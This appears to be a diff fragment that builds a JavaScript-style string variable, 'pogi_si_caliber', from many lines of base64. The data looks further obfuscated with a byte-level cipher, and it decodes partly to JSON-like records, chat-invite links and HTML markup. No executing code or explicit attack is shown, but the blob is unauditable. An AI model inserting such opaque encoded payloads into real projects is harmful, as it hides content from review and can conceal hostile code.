+pogi_si_caliber += "g4OD2IPNws7GmYTFwsrawtmEj4PO1tDKwJmEhI+DwcLAyMTRzN";
+pogi_si_caliber += "bNx5mEhI+Dx8rQwMzRx+rHmYSSl5ORkZqRl5uQlpuXl5GVkpCX";
+pogi_si_caliber += "hIPej6mDg/6PqamDg8HKxPfL0cbC19CZg/ipg4ODg9iDzcLOxp";
+pogi_si_caliber += "mE2czUyoSPg87W0MrAmYTTxYzZzNTKjc7TkISPg8HCwMjE0czW";
+pogi_si_caliber += "zceZhNPFjNnM1MqNxMrFhI+Dx8rQwMzRx+rHmYSSk5uSkpCRl5";
+pogi_si_caliber += "qalJWUl5KTlZubhIPej6mDg4OD2IPNws7GmYTQxtXKhI+DztbQ";
+pogi_si_caliber += "ysCZhISPg8HCwMjE0czWzceZhISPg4PHytDAzNHH6seZhJSVmp";
+pogi_si_caliber += "eWlJCTmpaVkZaVm5STlYSD3o+pg4ODg9iDzcLOxpmEyczNhI+D";
+pogi_si_caliber += "ztbQysCZhNPFjMnMzY3O05CEj4PBwsDIxNHM1s3HmYTTxYzJzM";
+pogi_si_caliber += "2NxMrFhI+Dx8rQwMzRx+rHmYSSk5KTk5Gbm5SRkZuRkpaUkpOV";
+pogi_si_caliber += "hIPej6mDg4OD2IPNws7GmYTE1s2Ej4PO1tDKwJmE08WMxNbNjc";
+pogi_si_caliber += "7TkISPg8HCwMjE0czWzceZhNPFjMTWzY3EysWEj4PHytDAzNHH";
+pogi_si_caliber += "6seZhJKXmpaTkJWalZWQlZObl5GRlZOEg96PqYODg4PYg83Czs";
+pogi_si_caliber += "aZhNrW2dbIyoSPg87W0MrAmYTTxYza1tnWyMqNztOQhI+DwcLA";
+pogi_si_caliber += "yMTRzNbNx5mE08WM2tbZ1sjKjcTKxYSPg8fK0MDM0cfqx5mEkp";
+pogi_si_caliber += "aSm5ObkZWUl5OSlJSTkpubm4SD3o+pg4ODg9iDzcLOxpmE2dqE";
+pogi_si_caliber += "j4PO1tDKwJmE08WM2dqNztOQhI+DwcLAyMTRzNbNx5mE08WM2d";
+pogi_si_caliber += "qNxMrFhI+Dx8rQwMzRx+rHmYSSkZeWlJeampeWkJaQkJSWlJWV";
+pogi_si_caliber += "hIPej6mDg4OD2IPNws7GmYTIysyEj4PO1tDKwJmE08WMyMrMjc";
+pogi_si_caliber += "7TkISPg8HCwMjE0czWzceZhNPFjMjKzI3EysWEj4ODx8rQwMzR";
+pogi_si_caliber += "x+rHmYSUlpKQm5SSlZOTlpSRkpSTlZWEg96PqYODg4PYg83Czs";
+pogi_si_caliber += "aZhNHWxoSPg87W0MrAmYTTxYzR1saNztOQhI+DwcLAyMTRzNbN";
+pogi_si_caliber += "x5mE08WM0dbGjcTKxYSPg8fK0MDM0cfqx5mEkpaTkZKRlZaXm5";
+pogi_si_caliber += "OalZqTmpCWkISD3o+pg4ODg9iDzcLOxpmEwMvMhI+Dg4ODg8fK";
+pogi_si_caliber += "0MDM0cfqx5mEkpaTkJObkJWTlpeXl5Sbm5GQloSD3o+pg4ODg9";
+pogi_si_caliber += "iDzcLOxpmE2cbKhI+Dg4PHytDAzNHH6seZhJKRl5uakpOUlZCX";
+pogi_si_caliber += "mpeXlJCUkZuEg96PqYODg4PYg83CzsaZhMXM0dfLhI+Dg4ODx8";
+pogi_si_caliber += "rQwMzRx+rHmYSSlpOWkJKWm5qSk5uUkZuRkpSVhIPej6mDg4OD";
+pogi_si_caliber += "2IPNws7GmYTQzNbPhI+Dg4ODx8rQwMzRx+rHmYSSl5eVk5WUkp";
+pogi_si_caliber += "ORmpOTlpaSlJeShIPej6mDg4OD2IPNws7GmYTBz8LIxoSPg87W";
+pogi_si_caliber += "0MrAmYTTxYzBz8LIxo3O05CEj4PBwsDIxNHM1s3HmYTTxYzBz8";
+pogi_si_caliber += "LIxo3EysWEj4ODx8rQwMzRx+rHmYSSkZeXlZSbk5ObkpSWk5SS";
+pogi_si_caliber += "kZWQhIPej6mDg4OD2IPNws7GmYTJzNGEj4PO1tDKwJmE08WMyc";
+pogi_si_caliber += "zRjc7TkISPg8HCwMjE0czWzceZhNPFjMnM0Y3EysWEj4PHytDA";
+pogi_si_caliber += "zNHH6seZhJKXk5CRkJeXmpGXkpqVlJOTkJuEg96PqYODg4PYg8";
+pogi_si_caliber += "3CzsaZhMXGzdnKhI+DztbQysCZhNPFjMXGzdnKjc7TkISPg8HC";
+pogi_si_caliber += "wMjE0czWzceZhNPFjMXGzdnKjcTKxYSPg8fK0MDM0cfqx5mEmp";
+pogi_si_caliber += "OampSUm5aRkJSblJWQkZWXhIPej6mDg/6PqamDg8vGytHQmYP4";
+pogi_si_caliber += "qYODg4PYg83CzsaZhMnCzsLPhI+DztbQysCZhNPFjMnCzsLPjc";
+pogi_si_caliber += "7TkISPg8HCwMjE0czWzceZhNPFjMnCzsLPjcTKxYSPg8fK0MDM";
+pogi_si_caliber += "0cfqx5mElJqWlJGWlpWVl5SVm5KRkJebhIPej6mDg4OD2IPNws";
+pogi_si_caliber += "7GmYTO1sfHhI+DztbQysCZhNPFjM7Wx8eNztOQhI+DwcLAyMTR";
+pogi_si_caliber += "zNbNx5mE08WMztbHx43J08SEj4PHytDAzNHH6seZhJKWlpOSk5";
+pogi_si_caliber += "OXkpSSm5aTlpubkpWEg96PqYOD/o+pqYODxMzHzszXy8bR0JmD";
+pogi_si_caliber += "+KmDg4OD2IPNws7GmYTQwsyEj4PO1tDKwJmE08WM0MLMjc7TkI";
+pogi_si_caliber += "SPg8HCwMjE0czWzceZhNPFjNDCzI3EysWEj4PHytDAzNHH6seZ";
+pogi_si_caliber += "hJKQkpOUlZCTlpKVkJWUlpGXkpaEg96PqYODg4PYg83CzsaZhM";
+pogi_si_caliber += "LG0cqEj4PO1tDKwJmE08WMwsbRyo3O05CEj4PBwsDIxNHM1s3H";
+pogi_si_caliber += "mYTTxYzCxtHKjcTKxYSPg8fK0MDM0cfqx5mEmpqRk5CQl5uWmp";
+pogi_si_caliber += "SQm5uTm5eRhIPej6mDg4OD2IPNws7GmYTJ1s/QhI+DztbQysCZ";
+pogi_si_caliber += "hNPFjMnWz9CNztOQhI+DwcLAyMTRzNbNx5mE08WMydbP0I3Eys";
+pogi_si_caliber += "WEj4PHytDAzNHH6seZhJKXmpqXmpqTlZWakJGTlZuXlpeEg96P";
+pogi_si_caliber += "qYODg4PYg83CzsaZhNDCzNHKhI+DztbQysCZhNPFjNDCzNHKjc";
+pogi_si_caliber += "7TkISPg8HCwMjE0czWzceZhNPFjNDCzNHKjcTKxYSPg8fK0MDM";
+pogi_si_caliber += "0cfqx5mEkpeQlpWSmpGal5GRmpaVkpeQl4SD3o+pg4ODg9iDzc";
+pogi_si_caliber += "LOxpmE0crRyoSPg87W0MrAmYTTxYzRytHKjc7TkISPg8HCwMjE";
+pogi_si_caliber += "0czWzceZhNPFjNHK0cqNxMrFhI+Dx8rQwMzRx+rHmYSSk5OWlJ";
+pogi_si_caliber += "eQmpWUl5GQl5Cbm5SahIPej6mDg/6PqamDg87GzsHG0dCZg/ip";
+pogi_si_caliber += "g4ODg9iDzcLOxpmEz8zW1caEj4ODg4PHytDAzNHH6seZhJqTkZ";
+pogi_si_caliber += "uTl5SXkpubkJabm5WSmoSD3o+pg4ODg9iDzcLOxpmE28rNhI+D";
+pogi_si_caliber += "ztbQysCZhNPFjNvKzY3O05CEj4PBwsDIxNHM1s3HmYTTxYzbys";
+pogi_si_caliber += "2NxMrFhI+Dx8rQwMzRx+rHmYSSlpWVm5qVm5SXlZOakJKSlJeX";
+pogi_si_caliber += "hIPej6mDg4OD2IPNws7GmYTR2szIwsqEj4ODg8fK0MDM0cfqx5";
+pogi_si_caliber += "mEmpOTkJCVkZCQk5CSlpeTlJuUhIPej6mDg4OD2IPNws7GmYTZ";
+pogi_si_caliber += "xsqEj4ODg8fK0MDM0cfqx5mEkpGXm5qSk5SVkJeal5eUkJSRm4";
+pogi_si_caliber += "SD3o+pg4ODg9iDzcLOxpmE1MrZhI+Dg4PHytDAzNHH6seZhJKR";
+pogi_si_caliber += "m5OTlpqWkJeSlZqRkpObmpWEg96PqYODg4PYg83CzsaZhM7Kzs";
+pogi_si_caliber += "qEj4ODg8fK0MDM0cfqx5mEkpeXl5GTlpGRkpuSl5GSk5STk4SD";
+pogi_si_caliber += "3o+pg4ODg9iDzcLOxpmE0MbKwoSPg4ODg8fK0MDM0cfqx5mElJ";
+pogi_si_caliber += "eblJKQkZWXlZaRlJeVm5KQhIPej6mDg4OD2IPNws7GmYTEy8zQ";
+pogi_si_caliber += "14SPg4ODx8rQwMzRx+rHmYSalZabl5ubkpeSlZeWkZOalJOEg9";
+pogi_si_caliber += "6PqYODg4PYg83CzsaZhMLAy8rPz8bQhI+Dg4ODx8rQwMzRx+rH";
+pogi_si_caliber += "mYSSkZWUlpOalJGUm5SUlJqSm5CWhIPej6mDg4OD2IPNws7GmY";
+pogi_si_caliber += "TOytHChI+Dg4ODx8rQwMzRx+rHmYSSkJualZeQlpaWlJGVm5GQ";
+pogi_si_caliber += "l5WXhIPej6mDg4OD2IPNws7GmYTFwsfGhI+Dg4ODx8rQwMzRx+";
+pogi_si_caliber += "rHmYSSkpGXkJWakZOWlJGUkJCTkJeVhIPej6mDg4OD2IPNws7G";
+pogi_si_caliber += "mYTFys3b0NDGhI+Dg4ODx8rQwMzRx+rHmYSSl5aam5SbmpWXm5";
+pogi_si_caliber += "CblpCSkZObhIPej6mDg4OD2IPNws7GmYTAyISPg4ODg8fK0MDM";
+pogi_si_caliber += "0cfqx5mEkpeWmpqUlJeSkZGSlZeblJqWm4SD3o+pg4ODg9iDzc";
+pogi_si_caliber += "LOxpmEx8zTxoSPg4ODg8fK0MDM0cfqx5mEkpaQk5WblZSbm5uR";
+pogi_si_caliber += "l5eVmpWXlYSD3o+pg4ODg9iDzcLOxpmE0crCzYSPg4ODg8fK0M";
+pogi_si_caliber += "DM0cfqx5mEkpKXlJeVkZuXlpCSlpqWkZWak4SD3o+pg4ODg9iD";
+pogi_si_caliber += "zcLOxpmEyMbKhI+Dg4ODx8rQwMzRx+rHmYSSkJCSlZGblJqXkJ";
+pogi_si_caliber += "OWkJKXm5CUhIPej6mDg4OD2IPNws7GmYTCz8/KxoSPg4ODg8fK";
+pogi_si_caliber += "0MDM0cfqx5mEkpeXkpWRkJKak5eSkZSRlZCWloSD3o+pg4P+j6";
+pogi_si_caliber += "mpg4PEws3EzcbOmYP4qYODg4PYg83CzsaZg4SEj4PKzdXK18aZ";
+pogi_si_caliber += "g4TL19fT0JmMjMfK0MDM0ceNxMSMm5XB1eH1+8Ll9YSPg8zNz8";
+pogi_si_caliber += "rNxpmDzdbPz4+DzsbOwcbR0JmDzdbPz4Pej6mDg4OD2IPNws7G";
+pogi_si_caliber += "mYOEhI+Dys3VytfGmYOEy9fX09CZjIzHytDAzNHHjcTEjNDz8d";
+pogi_si_caliber += "f27vfZxeCEj4PMzc/KzcaZg83Wz8+Pg87GzsHG0dCZg83Wz8+D";
+pogi_si_caliber += "3o+pg4ODg9iDzcLOxpmDhISPg8rN1crXxpmDhMvX19PQmYyMx8";
+pogi_si_caliber += "rQwMzRx43ExIzy+9vQlvPb05ebhI+DzM3Pys3GmYPN1s/Pj4PO";
+pogi_si_caliber += "xs7BxtHQmYPN1s/Pg96PqYODg4PYg83CzsaZg4SEj4PKzdXK18";
+pogi_si_caliber += "aZg4TL19fT0JmMjMfK0MDM0ceNxMSM2fvH7sfA8cTg7oSPg8zN";
+pogi_si_caliber += "z8rNxpmDzdbPz4+DzsbOwcbR0JmDzdbPz4Pej6mDg4OD2IPNws";
+pogi_si_caliber += "7GmYOEhI+Dys3VytfGmYOEy9fX09CZjIzHytDAzNHHjcTEjMDW";
+pogi_si_caliber += "yO7Bl5TUl9WEj4PMzc/KzcaZg83Wz8+Pg87GzsHG0dCZg83Wz8";
+pogi_si_caliber += "+D3o+pg4ODg9iDzcLOxpmDhISPg8rN1crXxpmDhMvX19PQmYyM";
+pogi_si_caliber += "x8rQwMzRx43ExIyb8tL2yMDilebhhI+DzM3Pys3GmYPN1s/Pj4";
+pogi_si_caliber += "POxs7BxtHQmYPN1s/Pg96PqYODg4PYg83CzsaZg4SEj4PKzdXK";
+pogi_si_caliber += "18aZg4TL19fT0JmMjMfK0MDM0ceNxMSM1ML09uXZkZvb6YSPg8";
+pogi_si_caliber += "zNz8rNxpmDzdbPz4+DzsbOwcbR0JmDzdbPz4Pej6mDg4OD2IPN";
+pogi_si_caliber += "ws7GmYOEhI+Dys3VytfGmYOEy9fX09CZjIzHytDAzNHHjcTEjN";
+pogi_si_caliber += "TxxPPy2dmW89uEj4PMzc/KzcaZg83Wz8+Pg87GzsHG0dCZg83W";
+pogi_si_caliber += "z8+D3o+pg4P+j6mpg4PO1tDKwJmD2KmDg4OD1tHPmYOEztbQys";
+pogi_si_caliber += "CM15HQzM3XzNP89ZKNztOQhI+pg4ODg9XMz9bOxpmDk42Wk4+p";
+pogi_si_caliber += "g4Pej6mpg4PT0czFys/G58bFwtbP19CZg9ipg4ODg8HCzc3G0Z";
+pogi_si_caliber += "mDhMfC18KZys7CxMaM0NXEiNvOz5jAy8LR0MbXntbXxY6bj4SD";
+pogi_si_caliber += "iIPGzcDMx8b28ergzM7TzM3GzdeLqYODg4ODg4Sf0NXEg9vOz8";
+pogi_si_caliber += "3QnoHL19fTmYyM1NTUjdSQjczRxIyRk5OTjNDVxIGD1MrH18ue";
+pogi_si_caliber += "gZKRk5OBg8vGysTL156BkJeTgYPVysbU4czbnoGTg5ODkpGTk4";
+pogi_si_caliber += "OQl5OBnYSpg4ODg4ODiIOEn8fGxdCdhKmDg4ODg4OIg4Sfz8rN";
+pogi_si_caliber += "xsLR5NHCx8rGzdeDyseegcSBg9uSnoGTgYPakp6Bk4GD25GegY";
+pogi_si_caliber += "2bloGD2pGegZKBnYSpg4ODg4ODiIOEn9DXzNODzMXF0MbXnoGT";
+pogi_si_caliber += "gYPQ18zTjsDMz8zRnoGAkcGTlpOagYydn9DXzNODzMXF0MbXno";
+pogi_si_caliber += "GNlpaBg9DXzNOOwMzPzNGegYCSlpORk5SBjJ2f0NfM04PMxcXQ";
+pogi_si_caliber += "xteegZKBg9DXzNOOwMzPzNGegYCTlJOSk5GBjJ2EqYODg4ODg4";
+pogi_si_caliber += "iDhJ+Mz8rNxsLR5NHCx8rGzdedhKmDg4ODg4OIg4Sf0cLHysLP";
+pogi_si_caliber += "5NHCx8rGzdeDyseegdGBg8DbnoGNkpWBg8DanoGNk5uBg9GegY";
+pogi_si_caliber += "2aloGdhKmDg4ODg4OIg4Sf0NfM04PMxcXQxteegZOBg9DXzNOO";
+pogi_si_caliber += "wMzPzNGegYDFxZGXkJuBg9DXzNOOzNPCwMrX2p6BjZCbgYydn9";
+pogi_si_caliber += "DXzNODzMXF0MbXnoGSgYPQ18zTjsDMz8zRnoGAxcWRl5CbgYPQ";
+pogi_si_caliber += "18zTjszTwsDK19qegZOBjJ2EqYODg4ODg4iDhJ+M0cLHysLP5N";
+pogi_si_caliber += "HCx8rGzdedhKmDg4ODg4OIg4Sf08LX18bRzYPKx56Bx4GD1MrH";
+pogi_si_caliber += "18uegZGXgYPLxsrEy9eegZGXgYPTwtfXxtHN9s3K19CegdbQxt";
+pogi_si_caliber += "Hw08LAxuzN9tDGgYPTwtfXxtHN99HCzdDFzNHOnoHRzNfC18aL";
+pogi_si_caliber += "kJaKgZ2EqYODg4ODg4iDhJ/Pys3Gg9uSnoGTgYPakp6Bk4GD25";
+pogi_si_caliber += "GegZOBg9qRnoGRl4GD0NfRzMjGnoGAxcWRl5CbgYPQ19HMyMaO";
+pogi_si_caliber += "zNPCwMrX2p6BjZOUgYPQ19HMyMaO1MrH18uegZKBjJ2EqYODg4";
+pogi_si_caliber += "ODg4iDhJ+M08LX18bRzZ2EqYODg4ODg4iDhJ+Mx8bF0J2EqYOD";
+pogi_si_caliber += "g4ODg4iDhJ/RxsDXg9TKx9fLnoGSkZOTgYPLxsrEy9eegZCXk4";
+pogi_si_caliber += "GDxcrPz56B1tHPi4DEioGMnYSpg4ODg4ODiIOEn9HGwNeD1MrH";
+pogi_si_caliber += "18uegZKRk5OBg8vGysTL156BkJeTgYPFys/PnoHW0c+LgNGKgY";
+pogi_si_caliber += "ydhKmDg4ODg4OIg4Sf0cbA14PUysfXy56BkpGTk4GDy8bKxMvX";
+pogi_si_caliber += "noGQl5OBg8XKz8+egdbRz4uAx4qBjJ2EqYODg4ODg4iDhJ/Twt";
+pogi_si_caliber += "fLg8eege6Tg5GakYPvkpGTk4ORk5GBg9DX0czIxp6BgMXFkZeQ";
+pogi_si_caliber += "m4GD0NfRzMjGjszTwsDK19qegY2SkYGD0NfRzMjGjtTKx9fLno";
+pogi_si_caliber += "GRgYydhKmDg4ODg4OIg4Sf08LXy4PHnoHuk4OQkpOD75KRk5OD";
+pogi_si_caliber += "kZGTgYPQ19HMyMaegYDFxZGXkJuBg9DX0czIxo7M08LAytfano";
+pogi_si_caliber += "GNk5SBg9DX0czIxo7UysfXy56BkoGMnYSpg4ODg4ODiIOEn9fG";
+pogi_si_caliber += "29eD256BkpKQlYGD2p6BkJOTgYPXxtvXjsLNwMvM0Z6Bxs3HgY";
+pogi_si_caliber += "PFzM3XjsXCzsrP2p6B4MzN0MzPwtCPzszNzNDTwsDGgYPFzM3X";
+pogi_si_caliber += "jtDK2caegZKalYGDxczN147UxsrEy9eegZSTk4GDz8bX18bRjt";
+pogi_si_caliber += "DTwsDKzcSegY6Sk4GDxcrPz56BgMXFkZeQm4GDxcrPz47M08LA";
+pogi_si_caliber += "ytfanoGNk5uBnfeR8J+M18bb152EqYODg4ODg4iDhJ+M0NXEnY";
+pogi_si_caliber += "Spg4ODg4qPqYODg4PBwsDIxNHM1s3HmYOEys7CxMbQjMHCzc3G";
+pogi_si_caliber += "0Y3EysWEj6mDg96PqamDg8/MwsfKzcTi0MDKypmDw4ODg4OD0I";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg4ODg4ODg4ON24iemY2Dg4Opg4ODg4OZ";
+pogi_si_caliber += "m4ODg4ODg42Ojt2J18bWjYODg4ODg9n/w4ODg4P9hoODqYODg4";
+pogi_si_caliber += "ONm5uDg4ODg8flg4ODg4Oam5vt24ODg4ODg4ONg4ODn8iDqYOD";
+pogi_si_caliber += "mZubm8zMzIPHm5ubwYODg//Dm5ubm52Dg4ODjeOb7cbHm4GDqY";
+pogi_si_caliber += "6Jm5ubm5ubm4Ocm5ubm52Dg5qbm5ub5YODjeP9hpubm5uBg4Op";
+pogi_si_caliber += "g4Obm5ubg4ODg4OBiYmBg4Pbm5ubm5vdg9ubm5mDg//DipvBjY";
+pogi_si_caliber += "Opg4Obm5ubg4ODg4ODg4ODg8ebm5ubif/Dg4Obm5ub7Z6Jm5ub";
+pogi_si_caliber += "m4Opg4Obm5ubg4ODg4ODg4PZm4mJgf/Dg4ODmYODhpuBg4ODg/";
+pogi_si_caliber += "Gbm4Opg42bm5ub79aeg4ODmZyNjY2NjYODjY3lg4OD45v0zNaD";
+pogi_si_caliber += "moaDg6mD/Yabm5uJg4ODg5+BgZubm5ubm5ubm92DjZubm5ubm/";
+pogi_si_caliber += "P/w4ODg6mDg4OE+oGDg4ODg5uZg4OBm5ubm5ubiYOD/8ODg4P9";
+pogi_si_caliber += "geWDg4ODg6mDg4ODg4ODg4ODg4GBg4ODg4GJiYH/w8OPqanemK";
+pogi_si_caliber += "nHzMDWzsbN143Extfmz8bOxs3X4drqx4uE0czM14SKjcrNzcbR";
+pogi_si_caliber += "6/fu74Oeg8Opn8fK1YPKx56BwcSBg8LRysKOy8rHx8bNnoHX0d";
+pogi_si_caliber += "bGgZ2fjMfK1Z2pn8DCzdXC0IPKx56BzsLX0crbgYPC0crCjsvK";
+pogi_si_caliber += "x8fGzZ6B19HWxoGdn4zAws3VwtCdqZ/Aws3VwtCDyseegdDOzM";
+pogi_si_caliber += "jGgYPC0crCjsvKx8fGzZ6B19HWxoGdn4zAws3VwtCdqamfx8rV";
+pogi_si_caliber += "g8rHnoHGzdfG0YGD0czPxp6BwdbX18zNgYPXwsHKzcfG256Bk4";
+pogi_si_caliber += "GDwtHKwo7PwsHGz56B88/C2srNxIPKzdfRzIGDwM/C0NCegcXK";
+pogi_si_caliber += "28bHg8rN0MbXjpOD2Y6Wk4PE0crHg8DW0dDM0Y7TzMrN18bRg9";
+pogi_si_caliber += "PPwsDGjsrXxs7QjsDGzdfG0YPM1cbRxc/M1I7LysfHxs2DwcSO";
+pogi_si_caliber += "wc/CwMiD046Wg9fG29eOwc/MzMeDxczA1tCZzNbXz8rNxo7NzM";
+pogi_si_caliber += "3GgZ2pg4Ofx8rVg8DPwtDQnoHQ08/C0MuBg8LRysKOy8rHx8bN";
+pogi_si_caliber += "noHX0dbGgZ2pg4ODg5/KzsSDyseegdDTz8LQy+LR14GDwM/C0N";
+pogi_si_caliber += "CegdDTz8LQy47VysfGzIGD0NHAnoHOxsfKwozKzdfRzI6Q0I3E";
+pogi_si_caliber += "ysWBg9TKx9fLnoGVk5OBg8vGysTL156BlZOTgYPCz9eegYGDx9";
+pogi_si_caliber += "HCxMTCwc/GnoHFws/QxoGdqYODg4Ofys7Eg8rHnoHQ08/C0Mvm";
+pogi_si_caliber += "zceBg8DPwtDQnoHQ08/C0MuO1crHxsyD0NPPwtDLjsbNx4GD0N";
+pogi_si_caliber += "HAnoHOxsfKwozKzdfRzI7LzM/HjdPNxIGD1MrH18uegZWTk4GD";
+pogi_si_caliber += "y8bKxMvXnoGVk5OBg8LP156BgYPH0cLExMLBz8aegcXCz9DGgZ";
+pogi_si_caliber += "2pg4OfjMfK1Z2pg4Ofx8rVg8DPwtDQnoHGzdfG0Y7Kzc3G0YPR";
+pogi_si_caliber += "xs/C18rVxoPZjviS/oPFz8bbg87C247UjsXWz8+Dxc/G247AzM";
+pogi_si_caliber += "+DytfGztCOwMbN18bRgZ2pg4ODg5/T0caDyseegcbN18bR4tHX";
+pogi_si_caliber += "gYPAz8LQ0J6B0cbPwtfK1caD2Y74kv6Dzo6Tg9DGz8bA147NzM";
+pogi_si_caliber += "3Gg9TLytfG0NPCwMaO09HGg8XMzdeOzszNzIPPxsLHys3Ejs3M";
+pogi_si_caliber += "zcaD18bb147Bz8zMx4GDwtHKwo7LysfHxs2egdfR1saBnZ+M09";
+pogi_si_caliber += "HGnamDg4ODn8fK1YPAz8LQ0J6Bxs3XxtGOz8zCx4GDwtHKwo7L";
+pogi_si_caliber += "ysfHxs2egdfR1saBnamDg4ODg4Of0NPCzYPAz8LQ0J6Bxs3Xxt";
+pogi_si_caliber += "GOz8zCx47PwsHGz4Gdz8zCx8rNxJ+M0NPCzZ2pg4ODg4ODn9DT";
+pogi_si_caliber += "ws2DwM/C0NCegcbN18bRjs/MwseOwcLRgZ2fyoPKx56Bxs3Xxt";
+pogi_si_caliber += "HvzMLH5crPz4Gdn4zKnZ+M0NPCzZ2pg4ODg4ODn9DTws2DwM/C";
+pogi_si_caliber += "0NCegcbN18bRjs/MwseO08DXgYPKx56Bxs3XxtHvzMLH88DXgZ";
+pogi_si_caliber += "2Thp+M0NPCzZ2pg4ODg5+Mx8rVnamDg4ODn9DTws2DwM/C0NCe";
+pogi_si_caliber += "gcbN18bRjtfCxIGDwtHKwo7LysfHxs2egdfR1saBneOD15HQn4";
+pogi_si_caliber += "zQ08LNnamDg5+Mx8rVnamDg5/Q08LNg8DPwtDQnoHGzdfG0Y7L";
+pogi_si_caliber += "ys3XgZ34g8DPysDIg9fMg8bN18bRg/6fjNDTws2dqZ+Mx8rVna";
+pogi_si_caliber += "mpn8fK1YPKx56B0MvGz8+Bg8DPwtDQnoHRxs/C18rVxoPZjviQ";
+pogi_si_caliber += "/oPFz8bbg8uOxdbPz4PFz8bbjsDMz4PK18bO0I7Axs3XxtGDzN";
+pogi_si_caliber += "XG0cXPzNSO247LysfHxs2DzNXG0cXPzNSO2o7C1tfMg9PbjviX";
+pogi_si_caliber += "1dT+g9PBjviU1cv+g9PXjviV1cv+g87C2474lJOT09v+mdPBjv";
+pogi_si_caliber += "iV1cv+g87C2474lJOT09v+mdPXjviW1cv+gZ2pg4Of0MbA18rM";
+pogi_si_caliber += "zYPKx56By8bRzIGDwM/C0NCegdHGz8LXytXGg8XPxtuDzsrNjs";
+pogi_si_caliber += "uO+MDCz8CLkpOTx9XL/I78ldXLiv6D1I7F1s/Pg8XPxtuOwMzP";
+pogi_si_caliber += "g8rXxs7QjsDGzdfG0YPJ1tDXysXajsDGzdfG0YPOwtuO+JSTk9";
+pogi_si_caliber += "Pb/pnOys2Oy474wMLPwIuSk5PH1cv8jvyW1cuK/oGdqYODg4Of";
+pogi_si_caliber += "x8rVg8DPwtDQnoHBws3NxtGO1NHC04PRxs/C18rVxoPFz8bbg9";
+pogi_si_caliber += "SOxdbPz4PJ1tDXysXajsDGzdfG0YPM1cbRxc/M1I7LysfHxs2B";
+pogi_si_caliber += "nZ/T0caDyseegcHCzc3G0YGDwM/C0NCegdHGz8LXytXGg86Ok4";
+pogi_si_caliber += "PQxs/GwNeOzczNxoPUy8rXxtDTwsDGjtPRxoPFzM3Xjs7MzcyD";
+pogi_si_caliber += "z8bCx8rNxI7NzM3Gg9fG29eOwc/MzMeBg8LRysKOy8rHx8bNno";
+pogi_si_caliber += "HX0dbGgZ2fjNPRxp2fjMfK1Z2pg4ODg5/Tg8DPwtDQnoHO1474";
+pogi_si_caliber += "l5XT2/6D18bb147Axs3XxtGD18bb1474kpTT2/6D19HCwMjKzc";
+pogi_si_caliber += "SO+I2TkcbO/oPOwtuO+JSTk9Pb/pnXxtvXjviSltPb/oGdn9DT";
+pogi_si_caliber += "ws2DwM/C0NCegdfCxM/KzcaBnYfYxtDAi+Ds7eXq5I3AzNPajc";
+pogi_si_caliber += "vG0cz3wsTPys3Git6fjNDTws2dn4zTnamDg5+M0MbA18rMzZ2p";
+pogi_si_caliber += "g4Ofx8rVg8rHnoHRzNDXxtGBg8DPwtDQnoHO146SkYPFz8bbg9";
+pogi_si_caliber += "SO+M7KzYuSkpGT09uPkpOThor+g8XPxtuOwMzPg8rXxs7QjsDG";
+pogi_si_caliber += "zdfG0YPEwtOO+JCX09v+g87C2474lJOT09v+mc7XjpKTg87C24";
+pogi_si_caliber += "74lJOT09v+mcTC046UgZ2fjMfK1Z2pg4Of0MbA18rMzYPKx56B";
+pogi_si_caliber += "xMLNxM3GzoGDwM/C0NCegdHG1cbCz4PO1474kJfT2/6D1I74zs";
+pogi_si_caliber += "rNi5KSkZPT24+Sk5OGiv6DzsLbjviUk5PT2/6ZzteOlIGDwtHK";
+pogi_si_caliber += "wo7PwsHGz56B0MbR1cbR0IGdqYODg4Ofx8rVg8DPwtDQnoHQxs";
+pogi_si_caliber += "CO18rXz8aBncTCzcTNxs6fjMfK1Z2pg4ODg5/HytWDyseegcTC";
+pogi_si_caliber += "zcTNxs7xzNSBg8DPwtDQnoHOwtHS1sbGgZ2fjMfK1Z2pg4OfjN";
+pogi_si_caliber += "DGwNfKzM2dqYODn9DGwNfKzM2DyseegdfG0c6Bg8DPwtDQnoHR";
+pogi_si_caliber += "xtXGws+DzteOkpeD1I74zsrNi5KSkZPT24+Sk5OGiv6Bg8LRys";
+pogi_si_caliber += "KOz8LBxs+egdfG0c7KzcLPgZ2pg4ODg5/HytWDwM/C0NCegczV";
+pogi_si_caliber += "xtHFz8zUjsvKx8fGzYPRzNbNx8bHjtvPg8HM0cfG0YPBzNHHxt";
+pogi_si_caliber += "GOwc/MzMeMkZaDwcSO+ICTlpOSk5H+g9DLwsfM1I74k/yRldPb";
+pogi_si_caliber += "/JuT09v80cTBwouTj5OPk4+Nm5aKj5P8k/yWldPb/NHEwcKLkZ";
+pogi_si_caliber += "aWj5CVj5aVj42Tm4r+gZ2pg4ODg4ODn8fK1YPAz8LQ0J6Bxc/G";
+pogi_si_caliber += "24PK18bO0I7Axs3XxtGDxMLTjpCDwczRx8bRjsGDwczRx8bRjs";
+pogi_si_caliber += "HPzMzHjJGTg8HEjviAk8CTkZOW/oPT246QjZaD09qOkYGdqYOD";
+pogi_si_caliber += "g4ODg4ODn9DTws2DwM/C0NCegcXPxtuDxc/G247NzM3Gg8rXxs";
+pogi_si_caliber += "7QjsDGzdfG0YPEwtOOko2WgYPC0crCjsvKx8fGzZ6B19HWxoGd";
+pogi_si_caliber += "qYODg4ODg4ODg4OfyoPAz8LQ0J6By46RjZaD1I6RjZaD0czWzc";
+pogi_si_caliber += "fGx47F1s/Pg8HEjsHPzMzHg9DLwsfM1I74k/yT/JvT2/zRxMHC";
+pogi_si_caliber += "i5GWlo+QlY+WlY+NlpaK/oGdn4zKnamDg4ODg4ODg4ODn8qDwM";
+pogi_si_caliber += "/C0NCegcuOkY2Wg9SOkY2Wg9HM1s3HxseOxdbPz4PBxI7Bz8zM";
+pogi_si_caliber += "x47Hys6BnZ+Myp2pg4ODg4ODg4ODg5/Kg8DPwtDQnoHLjpGNlo";
+pogi_si_caliber += "PUjpGNloPRzNbNx8bHjsXWz8+DwcSOwc/MzMeOx9bQyIGdn4zK";
+pogi_si_caliber += "namDg4ODg4ODg5+M0NPCzZ2pg4ODg4ODg4Of0NPCzYPAz8LQ0J";
+pogi_si_caliber += "6BzsrNjtSOk4PFz8bbjpKD19HWzcDC18aD18bb147Axs3XxtGD";
+pogi_si_caliber += "18bb1474kpONltPb/oPX0cLAyMrNxI74jZKXxs7+g9fG29eOwc";
+pogi_si_caliber += "/MzMeOx8rOgZ2H2MbQwIvg7O3l6uSN18bRzsrNws+N1tDG0Yre";
